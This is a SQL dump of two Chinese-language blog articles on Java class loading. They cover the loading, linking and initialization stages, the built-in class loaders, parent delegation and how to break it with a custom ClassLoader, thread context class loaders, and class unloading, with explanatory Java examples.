INSERT INTO `article` VALUES (105, 1, 'ClassLoader类加载的阶段过程', '2019/10/1570533935_mmexport1570368053996.jpg', '### 类加载\n#### 什么是类加载\n1. 每个编写的”.java”拓展名类文件都存储着需要执行的程序逻辑，这些”.java”文件经过Java编译器编译成拓展名为”.class”的文件，\n2. ”.class”文件中保存着Java代码经转换后的虚拟机指令，当需要使用某个类时，虚拟机将会加载它的”.class”文件，并创建对应的class对象，将class文件加载到虚拟机的内存，这个过程称为类加载\n\n### Java程序对类初始化\n#### 六种主动使用初始化,除此六种外其他都是被动使用\n```java\npublic class ClassActiveUse1 {\n    public static void main(String[] args) throws ClassNotFoundException {\n        // 第一种主动使用 初始化 new,直接使用\n        new Obj();\n\n        // 第二种主动使用 初始化 访问某个类或接口的静态变量,或者对该静态变量进行赋值操作\n        System.out.println(Obj.salary); // 对类的静态变量访问\n        System.out.println(I.a); // 对接口的静态变量访问\n        Obj.salary = 10000000; // 对类的静态变量进行赋值\n        // I.a = 12; // 无法对接口属性赋值,只能访问\n\n        // 第三种主动使用 初始化 调用静态方法\n        Obj.printSalary();\n\n        // 第四种主动使用 初始化 反射某个类\n        Class.forName(\"com.tuwq.stage1.Obj\");\n\n        // 第五种主动使用 初始化了一个该类的子类\n        System.out.println(Child.age); // Child被初始化前Obj先被初始化了\n    }\n\n    static {\n        // 第六种 启动类,启动main方法的类,就是ClassActiveUse类\n        System.out.println(\"启动类\"); // 启动类初始化\n    }\n}\n\nclass Obj {\n\n    public static long salary = 100000L;\n\n    static {\n        System.out.println(\"obj 被初始化\");\n    }\n\n    public static void printSalary() {\n        System.out.println(\"========Obj=printSalary=====\");\n    }\n}\n\nclass Child extends Obj {\n\n    public static int age = 32;\n\n    static {\n        System.out.println(\"Child被初始化\");\n    }\n}\n\ninterface I {\n    public static final int a = 10; // 默认public static final\n}\n```\n1. new,直接使用\n2. 访问某个类或接口的静态变量,或者对该静态变量进行赋值操作\n3. 调用静态方法\n4. 反射某个类\n5. 初始化一个子类\n6. 启动类,启动main方法的类\n7. 所有的Java虚拟机实现必须在每个类或接口被Java程序 *首次主动使用* 时才初始化它们,当然现代JVM有可能根据程序的上下文语义推断出接下来可能初始化谁\n\n#### 不会初始化的情况\n```java\npublic class NoInit {\n    public static void main(String[] args) throws ClassNotFoundException {\n        // (1) 通过子类访问父类得静态变量,不会初始化导致子类的初始化\n        System.out.println(Child.salary); // 被动引用 子类访问父类静态变量 子类不会初始化 父类会初始化\n\n        // (2) 定义引用数组,不会初始化类\n        Obj[] array = new Obj[10]; // 数组引用不会初始化\n\n        // (3) final修饰的常量会在编译期间放到常量池中,不会初始化类\n        System.out.println(Obj.salary); // 不会初始化 引用常量\n        // 注意! final修饰的复杂类型,在编译期间无法计算得出,会初始化类\n        System.out.println(Obj.x); // 会初始化 常量值Random不是常量,需要运行期算出来\n    }\n}\nclass Obj {\n\n    public static long salary = 100000L;\n\n    public static final int x = new Random().nextInt(100);\n\n    static {\n        System.out.println(\"obj 被初始化\");\n    }\n\n    public static void printSalary() {\n        System.out.println(\"========Obj=printSalary=====\");\n    }\n}\n\nclass Child extends Obj {\n\n    public static int age = 32;\n\n    static {\n        System.out.println(\"Child被初始化\");\n    }\n}\n\ninterface I {\n    public static final int a = 10; // 默认public static final\n}\n```\n### 类加载的三个阶段\n![classloading.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570541862_classloading.png)\n#### 加载\n1. 查找并且加载类的二进制数据\n\n#### 链接\n1. 验证: 确保被加载类的正确性\n2. 准备: 为类的静态变量分配内存,并将其初始化为默认值\n3. 解析: 把类中的符号引用转换为直接引用\n\n#### 初始化\n1. 为类的静态变量赋予正确的初始值\n\n### 加载阶段\n![loading.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570541862_loading.png)\n![loading2.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570541862_loading2.png)\n#### 加载阶段作用\n1. 类的加载简单来说,就是将class文件中的二进制数据读取到内存中,将其放在方法区中,然后在堆区中创建一个java.lang.Class对象,用来封装在方法区的数据结构\n2. 更具体一些: 将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区中的运行时数据结构，在堆中生成一个代表这个类的java.lang.Class对象，作为方法区类数据的访问入口，这个过程需要类加载器参与\n3. 当系统运行时，类加载器将.class文件的二进制数据从外部存储器（如光盘，硬盘）调入内存中，CPU再从内存中读取指令和数据进行运算，并将运算结果存入内存中。内存在该过程中充当着\"二传手\"的作用，通俗的讲，如果没有内存，类加载器从外部存储设备调入.class文件二进制数据直接给CPU处理，而由于CPU的处理速度远远大于调入数据的速度，容易造成数据的脱节，所以需要内存起缓冲作用。\n4. 类将.class文件加载至运行时的方法区后，会在堆中创建一个Java.lang.Class对象，用来封装类位于方法区内的数据结构，该Class对象是在加载类的过程中创建的，每个类都对应有一个Class类型的对象，Class类的构造方法是私有的，只有JVM能够创建。因此Class对象是反射的入口，使用该对象就可以获得目标类所关联的.class文件中具体的数据结构。\n5. 在加载阶段完成后,虚拟机外部的的二进制数据数据量就会按照虚拟机所需要的格式存储在方法区中(数据结构),然后在堆区中创建一个Class对象,这个对象作为程序访问方法区中这些数据结构的外部接口.\n6. *类加载的最终产物就是位于堆中的Class对象*，该对象封装了类在方法区中的数据结构，并且向用户提供了访问方法区数据结构的接口，即Java反射的接口\n\n#### 类加载的方式\n1. 本地磁盘中直接加载\n2. 内存中直接加载\n3. 通过网络加载.class\n4. 从zip,jar等归档文件中加载.class文件\n5. 数据库中提取.class文件\n6. 动态编译\n\n### 链接阶段-验证\n#### 链接阶段的验证子阶段作用\n1. 确保加载的类信息符合JVM规范，没有安全方面的问题\n2. 加载阶段与链接阶段的部分内容可以是交叉进行的,比如一部分代码加载完成就可以进行验证,提高效率\n3. 验证主要的目的是确保Class文件中的字节流中包含的信息符合虚拟机的要求,并且不会损害到JVM自身安全\n\n#### 验证种类\n1. **文件格式验证**:魔术因子是否正确,0XCAFEBABE,主从版本号是否符合当前虚拟机,常量池中的常量类型是不是不支持等等\n2. **语义检查**: 是否有父类,父类是不是允许继承,是否实现了抽象方法,是否覆盖了父类的final字段,等其他的语义检查\n3. **字节码验证**: 主要进行数据流和控制流的分析,不会出现这样的情况,在操作栈中放置了一个int类型,但是却给了一个long行的数据\n4. **符号引用验证**调用了一个不存在方法,字段等等;符号引用验证的目的是确保解析动作能正常执行,如果无法通过符号引用验证,将会抛出一个java.lang.IncompatibleClassChangeError异常的子类,如java.lang.IllegalAccessError,java.lang.NoSuchFieldError,java.lang.NoSuchMethodError\n\n### 链接阶段-准备\n#### 链接阶段的准备子阶段作用\n1. 正式为类变量（static变量）分配内存并设置类变量初始值的阶段，这些内存都将在方法区中进行分配\n\n#### 类变量类型的初始值\n```java\n// 数据类型		零值\nint				 0\nlong				0L\nshort			  (short)0\nchar				\'\\u0000\'\nbyte			   (byte)0\nboolean		     false \nfloat				0.0f \ndouble 			  0.0d\nreference			null 	 	\n```\n### 链接阶段-解析\n#### 链接阶段的解析子阶段作用\n1. *虚拟机常量池的符号引用替换为字节引用过程*\n2. 虚拟机规范之中并未规定解析阶段发生的具体时间,只要求在执行anewarray,checkcast,getfield,getstatic,instanceof,invokeinterface,invokespecial,invokestatic,invokevirtual,multianewarry,new,putfield和putstatic这13个用于操作符号引用的字节码指令之前,先对它们所使用的符号引用进行解析,所以虚拟机实现会根据需要来判断,到底是在类被加载器加载时就对常量池中的符号引用进行解析,还是等到一个符号引用将要被使用前才去解析它\n\n#### 解析种类\n1. 类或者接口的解析\n2. 字段解析\n3. 类方法解析\n4. 接口方法解析\n\n### 初始化阶段\n#### 初始化阶段作用\n```java\npublic class Singleton {\n\n    private static Singleton instance = new Singleton();\n\n    public static int x = 0;\n\n    public static int y;\n\n    /**\n     * 调整Singleton代码位置将会对x产生不同结果\n     * private static Singleton instance = new Singleton();\n     * public static int x = 0;\n     * public static int y;\n     * 结果: x = 0 ,y = 1\n     *\n     * 过程为\n     * instance = null;(default)\n     * instance = new Singleton();\n     * x = 0(default)\n     * y = 0(default)\n     * x++ -> x = 1\n     * y++ -> y = 1\n     * int x = 0;(init)\n     * x = 1;\n     * y = 0\n     */\n\n    /**\n     * public static int x = 0;\n     * public static int y;\n     * private static Singleton instance = new Singleton();\n     * 结果: x = 1 ,y = 1\n     *\n     * 过程为\n     * x = 0;(default)\n     * int x = 0;(init)\n     * y = 0;(default)\n     * instance = null;(default)\n     * instance = new Singleton();\n     * x++ -> x = 1\n     * y++ -> y = 1\n     * x = 1;\n     * y = 1;\n     */\n\n    private Singleton() {\n        x++;\n        y++;\n    }\n\n    public static Singleton getInstance() {\n        return instance;\n    }\n\n    public static void main(String[] args) {\n        Singleton singleton = Singleton.getInstance();\n        System.out.println(singleton.x);\n        System.out.println(singleton.y);\n    }\n}\n```\n```java\npublic class ClinitThreadTest {\n    public static void main(String[] args) {\n        new Thread(() -> new SimpleObject()).start();\n\n        new Thread(() -> new SimpleObject()).start();\n    }\n    static class SimpleObject {\n        private static AtomicBoolean init = new AtomicBoolean(true);\n        static {\n            System.out.println(Thread.currentThread().getName() + \" I will be initial.\");\n            while (init.get()) {\n\n            }\n            System.out.println(Thread.currentThread().getName() + \" I am finished initial.\");\n        }\n    }\n}\n```\n1. 初始化阶段是执行类构造器（）方法的过程。类构造器（）方法是由编译器自动收藏类中的所有类变量的赋值动作和静态语句块(static块)中的语句合并产生，代码从上往下执行。 \n2. 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化\n3. *虚拟机会保证一个类的<clinit\\>()方法在多线程环境中被正确加锁和同步*\n\n#### <clinit\\>函数\n![clinit.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570543084_clinit.png)\n1. 初始化阶段是类加载过程中的最后一步\n2. 初始化阶段是执行构造函数<clinit\\>方法的过程\n3. <clinit\\>()方法是由编译器自动收集类中的所有变量的赋值动作和静态语句块中的语句合并产生的\n4. 静态语句块中只能访问到定义在静态语句块之前的变量,定义在他之后的变量,只能赋值,不能访问\n5. <clinit\\>方法与类的构造函数有点区别,他不需要显示的调用父类的构造函数,虚拟机会保证在子类的<clinit\\>执行之前,先执行父类的<clinit\\>,因此在虚拟机中首先被执行的是Object<clinit\\>()方法\n6. 由于父类的<clinit\\>方法要先执行,也就意味着父类中定义的静态语句块,要优先于子类\n7. <clinit>方法对于一个类来说并不是必须的,因为没有静态代码块静态属性的话可能不是必须的\n8. 接口中同样存在<clinit>()方法，但是不需要先执行父接口的<clinit>(),接口中也可以有静态的属性\n9. 虚拟机有义务保证<clinit>()方法的线程安全,保证clinit过程中只有一个线程操作', 0, 0, 32, 0, 0, '2019-10-08 19:25:41', '2019-10-08 22:43:55', 0, 0);
INSERT INTO `article` VALUES (106, 1, '自定义ClassLoader与双亲委派机制', '2019/10/1570545797_mmexport1570367948599.jpg', '### 类加载器的种类\n#### JVM自带的类加载器\n![classloaderType.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570547555_classloaderType.png)\n1. **根(Bootstrap)类加载器**: 该加载器没有父加载器,它负责加载虚拟机的核心类库,如java.lang.*等;java.lang.Objectj就是由根类加载器加载的,根类加载器从系统属性sub.boot.class.path所指定的目录加载类库.根类加载器的实现依赖于底层操作系统,属于虚拟机的实现的一部分;主要加载的是JVM自身需要的类，这个类加载使用C++语言实现的，是虚拟机自身的一部分，它负责将 /lib路径下的核心类库或-Xbootclasspath参数指定的路径下的jar包加载到内存中，注意必由于虚拟机是按照文件名识别加载jar包的，如rt.jar，如果文件名不被虚拟机识别，即使把jar包丢到lib目录下也是没有作用的(出于安全考虑，Bootstrap引导类加载器只加载包名为java、javax、sun等开头的类)。因为是C++编写,所以它并没有继承java.lang.ClassLoader类,\n2. **扩展(Extension)类加载器**: 它的父加载器为根类加载器,它从java.ext.dirs系统属性所指定的目录中加载类库,或者从JDK的安装目录的jre/lib/ext子目录(扩展目录)下加载类库,如果把用户创建的JAR文件放在这个目录下,也会自动由扩展类加载器加载.扩展类加载器是纯Java类；扩展(Extension)类加载器是指Sun公司(已被Oracle收购)实现的sun.misc.Launcher$ExtClassLoader类，由Java语言实现的，是Launcher的静态内部类，它负责加载/lib/ext目录下或者由系统变量-Djava.ext.dir指定位路径中的类库，开发者可以直接使用标准扩展类加载器。它是java.lang.ClassLoader类的子类\n3. **系统(System)类加载器**: 也称为应用(App)类加载器,它的父加载器为扩展类加载器.它从环境变量classpath或者系统属性java.class.path所指定的目录中加载类.它是用户自定义的类加载器的默认父加载器,系统类加载器是纯Java类;是指 Sun公司实现的sun.misc.Launcher$AppClassLoader。它负责加载系统类路径java -classpath或-D java.class.path 指定路径下的类库，也就是我们经常用到的classpath路径，开发者可以直接使用系统类加载器，一般情况下该类加载是程序中默认的类加载器，通过ClassLoader#getSystemClassLoader()方法可以获取到该类加载器,它是java.lang.ClassLoader类的子类\n\n#### 类加载器的关系\n```java\npublic static void main(String[] args) throws ClassNotFoundException {\n        System.out.println(System.getProperty(\"sun.boot.class.path\"));\n        System.out.println(System.getProperty(\"java.ext.dirs\"));\n\n        Class<?> klass = Class.forName(\"com.tuwq.stage1.SimpleObject\");\n        System.out.println(klass.getClassLoader()); // sun.misc.Launcher$AppClassLoader\n        System.out.println(klass.getClassLoader().getParent()); // sun.misc.Launcher$ExtClassLoader\n        System.out.println(klass.getClassLoader().getParent().getParent()); // null 由于根加载器是c,c++编写,所以是null\n\n        Class<?> clazz = Class.forName(\"java.lang.String\");\n        System.out.println(clazz);\n        System.out.println(clazz.getClassLoader());// null 根加载器加载java.lang.String\n    }\n```\n1. **根(引导)类加载器**: 由C++实现，没有父类。\n2. **扩展(拓展)类加载器**:  由Java语言实现，父类加载器为null\n3. **系统(应用)类加载器**: 由Java语言实现，父类加载器为ExtClassLoader\n4. **自定义类加载器**: 父类加载器为AppClassLoader\n5. *加载器之间是包装(包含)关系而不是继承关系*\n\n### ClassLoader的核心方法\n#### loadClass(String)\n1. 该方法加载指定名称（包括包名）的二进制类型,loadClass()方法是ClassLoader类自己实现的，该方法中的逻辑就是双亲委派模式的实现;\n2. loadClass(String name, boolean resolve)是一个重载方法，resolve参数代表是否生成class对象的同时进行解析相关操作。\n3. 当类加载请求到来时，先从缓存中查找该类对象，如果存在直接返回，如果不存在则交给该类加载去的父加载器去加载，倘若没有父加载则交给顶级启动类加载器去加载，最后倘若仍没有找到，则使用findClass()方法去加载\n4. 从loadClass实现也可以知道如果不想重新定义加载类的规则，也没有复杂的逻辑，只想在运行时加载自己指定的类，那么我们可以直接使用this.getClass().getClassLoder.loadClass(\"className\")，这样就可以直接调用ClassLoader的loadClass方法获取到class对象。\n\n#### findClass(String)\n1. 在自定义类加载时，总会去继承ClassLoader类并重写loadClass方法，从而实现自定义的类加载类，但是在JDK1.2之后已不再建议用户去覆盖loadClass()方法，而是建议把自定义的类加载逻辑写在findClass()方法中\n2. 从前面的分析可知，findClass()方法是在loadClass()方法中被调用的，当loadClass()方法中父加载器加载失败后，则会调用自己的findClass()方法来完成类加载，这样就可以保证自定义的类加载器也符合双亲委托模式。\n3. 要注意的是ClassLoader类中并没有实现findClass()方法的具体代码逻辑，取而代之的是抛出ClassNotFoundException异常，同时应该知道的是findClass方法通常是和defineClass方法一起使用的\n\n#### defineClass(byte[], int, int)\n1. defineClass()方法是用来将byte字节流解析成JVM能够识别的Class对象(ClassLoader中已实现该方法逻辑)\n2. 通过这个方法不仅能够通过class文件实例化class对象，也可以通过其他方式实例化class对象，如通过网络接收一个类的字节码，然后转换为byte字节流创建对应的Class对象\n3. defineClass()方法通常与findClass()方法一起使用，一般情况下，在自定义类加载器时，会直接覆盖ClassLoader的findClass()方法并编写加载规则，取得要加载类的字节码后转换成流，然后调用defineClass()方法生成类的Class对象\n\n#### resolveClass(Class<?>)\n1. 使用该方法可以使用类的Class对象创建完成也同时被解析。\n2. 依据类加载的链接阶段主要是对字节码进行验证,为类变量分配内存并设置初始值同时将字节码文件中的符号引用转换为直接引用\n\n### 自定义ClassLoader\n#### 自定义加载器\n```java\npublic class MyClassLoader extends ClassLoader {\n	// 读取class文件的目录根路径\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\classloader1\";\n\n    private String dir = DEFAULT_DIR;\n\n    private String classLoaderName;\n\n    public MyClassLoader() {\n        super();\n    }\n\n    public MyClassLoader(String classLoaderName) {\n        super();\n        this.classLoaderName = classLoaderName;\n    }\n\n    public MyClassLoader(String classLoaderName, ClassLoader parent) {\n        super(parent);\n        this.classLoaderName = classLoaderName;\n    }\n\n    /**\n     * 读取class文件并加载Class\n     * @param name\n     * @return\n     * @throws ClassNotFoundException\n     */\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under \" + dir);\n        }\n        byte[] classBytes = loadClassBytes(classFile);\n        if (null == classBytes || classBytes.length == 0)\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    /**\n     * 读取class文件转换为字节数组\n     * @param classFile\n     * @return\n     */\n    private byte[] loadClassBytes(File classFile) {\n        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();\n             FileInputStream fis = new FileInputStream(classFile)) {\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) != -1) {\n                baos.write(buffer, 0, len);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public String getDir() {\n        return dir;\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n\n    public String getClassLoaderName() {\n        return classLoaderName;\n    }\n}\n```\n#### 测试\n```java\npublic static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {\n        MyClassLoader classLoader = new MyClassLoader(\"MyClassLoader\");\n		// 运行此main方法前,先在ide中将该类删除\n		// 否则会因为双亲委托机制导致使用应用类加载器加载的MyObject,而不是自定义加载器所加载的class文件位置\n        Class<?> aClass = classLoader.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass); // class com.tuwq.stage1.MyObject\n        System.out.println(aClass.getClassLoader());// com.tuwq.stage1.MyClassLoader\n\n        Object obj = aClass.newInstance();\n        Method method = aClass.getMethod(\"hello\", new Class<?>[]{});\n        Object result = method.invoke(obj, new Object[]{});\n        System.out.println(result); // hello\n    }\n```\n\n### 双亲委托机制\n![classloaderCommission.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570550624_classloaderCommission.png)\n#### 什么是双亲委派模式\n1. 如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归\n2. 请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，向下传递,子加载器才会尝试自己去加载，这就是双亲委派模式 \n\n#### 同一个加载器或同一个父类加载器,Class是同一个\n```java\npublic static void main(String[] args) throws ClassNotFoundException {\n        MyClassLoader classLoader1 = new MyClassLoader(\"MyClassLoader1\");\n        MyClassLoader classLoader2 = new MyClassLoader(\"MyClassLoader2\", classLoader1);\n        classLoader2.setDir(\"E:\\\\databak\\\\classloader2\");\n\n        // 同一个加载器或同一个父类加载器,Class是同一个\n        Class<?> aClass = classLoader1.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass.hashCode());\n        Class<?> aClass2 = classLoader2.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass2.hashCode());\n        System.out.println(aClass.hashCode() == aClass2.hashCode()); // true\n        System.out.println(((MyClassLoader)aClass.getClassLoader()).getClassLoaderName()); // MyClassLoader1\n    }\n```\n\n#### 不同加载器加载不同Class\n```java\npublic static void main(String[] args) throws ClassNotFoundException {\n        MyClassLoader classLoader1 = new MyClassLoader(\"MyClassLoader1\");\n        MyClassLoader classLoader2 = new MyClassLoader(\"MyClassLoader2\");\n        classLoader2.setDir(\"E:\\\\databak\\\\classloader2\");\n\n        // 不同加载器,Class不是同一个\n        Class<?> aClass = classLoader1.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass.hashCode());\n        Class<?> aClass2 = classLoader2.loadClass(\"com.tuwq.stage1.MyObject\");\n        System.out.println(aClass2.hashCode());\n        System.out.println(aClass.hashCode() == aClass2.hashCode()); // false\n        System.out.println(((MyClassLoader)aClass.getClassLoader()).getClassLoaderName());\n    }\n```\n\n#### 双亲委派模式有什么好处\n1. **避免重复加载**: 采用双亲委派模式的是好处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次\n2. **安全因素**: java核心api中定义类型不会被随意替换，假设通过网络传递一个名为java.lang.Integer的类，通过双亲委托模式传递到启动类加载器，而启动类加载器在核心Java API发现这个名字的类，发现该类已被加载，并不会重新加载网络传递的过来的java.lang.Integer，而直接返回已加载过的Integer.class，这样便可以防止核心API库被随意篡改\n3. **防止胡编乱造的类**,如java.lang.ABC: 由于父类加载器路径下并没有该类，所以不会加载，将反向委托给子类加载器加载，最终会通过系统类加载器加载该类。但是这样做是不允许,java.lang是核心API包，需要访问权限，强制加载将会报出如下异常java.lang.SecurityException: Prohibited package name: java.lang\n\n#### 类加载器的名词\n1. 定义类加载器: 这个类由哪个加载器加载的,这个加载器就叫这个类的定义类加载器\n2. 初始类加载器: 不断追寻父类加载器,那么追寻到所有的父类加载器就都叫类的初始化类加载器 \n\n### 打破双亲委托机制\n#### 查看ClassLoader源码\n![damageCommission.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570551439_damageCommission.png)\n1. ClassLoader的loadClass(String,boolean)方法中发现了进行双亲委托的代码\n2. 这意味着我们可以尝试重写loadClass让自定义加载器来打破双亲委托机制\n\n#### 自定义ClassLoader重写loadClass方法\n```java\npublic class SimpleClassLoader extends ClassLoader {\n\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\revert\";\n\n    private String dir = DEFAULT_DIR;\n\n    private String classLoaderName;\n\n    public SimpleClassLoader() {\n        super();\n    }\n\n    public SimpleClassLoader(String classLoaderName) {\n        super();\n        this.classLoaderName = classLoaderName;\n    }\n\n    public SimpleClassLoader(String classLoaderName, ClassLoader parent) {\n        super(parent);\n        this.classLoaderName = classLoaderName;\n    }\n\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under \" + dir);\n        }\n        byte[] classBytes = loadClassBytes(classFile);\n        if (null == classBytes || classBytes.length == 0)\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    private byte[] loadClassBytes(File classFile) {\n        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();\n             FileInputStream fis = new FileInputStream(classFile)) {\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = fis.read(buffer)) != -1) {\n                baos.write(buffer, 0, len);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    @Override\n    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n        Class<?> clazz = null;\n	 	// java.lang.Object等以java包名开头的类需要父加载器进行加载\n        if (name.startsWith(\"java.\")) {\n            try {\n                ClassLoader system = ClassLoader.getSystemClassLoader();\n                clazz = system.loadClass(name);\n                if (clazz != null) {\n                    if (resolve) {\n                        resolveClass(clazz);\n                    }\n                    return clazz;\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        try {\n            clazz = findClass(name);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        if (clazz == null && getParent() != null) {\n            clazz = getParent().loadClass(name);\n        }\n        return clazz;\n    }\n\n    public String getDir() {\n        return dir;\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n\n    public String getClassLoaderName() {\n        return classLoaderName;\n    }\n}  \n```\n#### 测试\n```java\npublic static void main(String[] args) throws ClassNotFoundException {\n        SimpleClassLoader simpleClassLoader = new SimpleClassLoader();\n        // 打破双亲委托\n		// 不在ide中将该类删除,那么会去用AppClassLoader去加载\n		// 但由于重写了loadClass方法,非java包名开头的类不会委托父加载器\n        Class<?> aClass = simpleClassLoader.loadClass(\"com.tuwq.stage2.SimpleObject\");\n        System.out.println(aClass.getClassLoader());// com.tuwq.stage2.SimpleClassLoader \n}\n```\n\n#### 尝试将loadClass方法中if判断删除并加载自己的java包名开头的类\n```java\n	@Override\n    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n        Class<?> clazz = null;\n        if (clazz == null && getParent() != null) {\n            clazz = getParent().loadClass(name);\n        }\n        return clazz;\n    } \n```\n```java\npublic static void main(String[] args) throws ClassNotFoundException {\n        SimpleClassLoader simpleClassLoader = new SimpleClassLoader();\n        // 尝试加载自己的java.lang.String\n        Class<?> aClass = simpleClassLoader.loadClass(\"java.lang.String\"); // 被限制了 Prohibited package name: java.lang\n		// 加载失败了,jdk对此做了安全防范\n		// 即使修改了委托机制,使用自定义加载器也无法重写java.lang等核心包的类\n        System.out.println(aClass.getClassLoader());// null\n}   \n```\n### 线程上下文的类加载器的作用\n#### 线程的上下文类加载器使用\n```java\npublic static void main(String[] args){\n        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();\n        System.out.println(contextClassLoader);\n\n        Thread.currentThread().setContextClassLoader(new MyClassLoader());\n        System.out.println(Thread.currentThread().getContextClassLoader());\n}\n```\n\n#### 线程上下文类加载器的作用\n![spi.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570607041_spi.png)\n1. 将类加载器绑定到线程当中,在本线程的执行过程中取出\n2. 由于双亲委托机制的原因,导致许多第三方实现类无法使用;因为加载第三方的jar包需要依靠系统应用加载器在classpath路径所进行加载的,但是由于JVM的核心rt.jar中包名都是以java.*开头,导致都被根加载器所加载,而不会去用系统应用加载器去加载第三方编写的类库\n3. 可以实现第三方直接实现类来接收和定义变量,但是这就违背了面向接口编程\n4. 因为这样的原因,java的解决方案是在会使用根类加载器的这些类中使用线程上下文的类加载器来加载一次这些实现类,并来和Class.forName()注册的实现类进行比较来保证面向接口编程\n\n#### 数据加载使用类加载器使得让系统应用加载器加载类库,保证面向接口编程\n```java\n// 为什么用数据库前要先调用这个?因为它要注册Driver\nClass.forName(\"com.mysql.jdbc.Driver\");\nConnection connection = DriverManager.getConnection(\"\"); \n```\n```java\n// com.mysql.jdbc.Driver extends java.sql.Driver\n// <clinit>()\nstatic {\n	try {\n		// 这个Driver是Mysql的实现类\n		// 添加至jvm的驱动管理器,会用来比较使用\n		java.sql.DriverManager.registerDriver(new Driver());\n	} catch(SQLException e){\n		throw RuntimeException(\"Can\'t register driver\");\n	}	\n}\n```\n![dbloading1.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570609286_dbloading1.png)\n![dbloading2.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570609287_dbloading2.png)\n![dbloading3.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570609287_dbloading3.png)\n\n### 类加载器的命名空间运行时包和卸载回收\n#### 命名空间和运行时包\n![classNameSpace.png](http://blog.img.tuwq.cn/upload/artimg/2019/10/1570598050_classNameSpace.png)\n```java\n// RuntimePackage.class由系统应用类加载器加载的\npublic class RuntimePackage {\n    // Boot.Ext.App.com.tuwq.stage2.SimpleObject 系统应用加载器的命名空间运行时包 这里看不到自定义加载器\n    // Boot.Ext.App.SimpleClassLoader.com.tuwq.stage2.SimpleObject 自定义加载器的命名空间运行时包\n    // 父加载器看不到子加载器加载的类 不同加载器之间也看不到相互的类\n    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        // 打破委托机制的自定义加载器\n        SimpleClassLoader simpleClassLoader = new SimpleClassLoader();\n        Class<?> aClass = simpleClassLoader.loadClass(\"com.tuwq.stage2.SimpleObject\");\n        System.out.println(aClass);\n        System.out.println(aClass.getClassLoader());\n        // 在当前系统应用类加载器中加载自定义加载器加载的类 报错了 java.lang.ClassCastException\n        // 无法转换 因为运行时包问题,应用类加载器看不到自定义加载器下的Class\n        SimpleObject simpleObject = (SimpleObject) aClass.newInstance();\n    }\n}\n```\n1. 每个类加载器都有命名空间,命名空间由该加载器及其所有父加载器所加载的类组成,在同一个命名空间中,不会出现完整的名字\n2. 父类加载器看不到子类加载器加载的类,不同命名空间下的类加载器之间的类互相不可访问\n\n#### 类的卸载以及ClassLoader的卸载回收\n1. JVM中的Class只有满足以下三个条件,才能被GC回收,也就是该Class被卸载(unload)\n2. 该类所有的实例都已经被GC\n3. 加载该类的ClassLoader实例已经被GC\n4. 该类的java.lang.Class对象没有在任何地方被引用\n5. GC的时机我们是不可控的,那么同样的我们对于Class的卸载也是不可控的', 0, 0, 41, 0, 0, '2019-10-08 22:43:32', '2019-10-09 16:21:39', 0, 0);
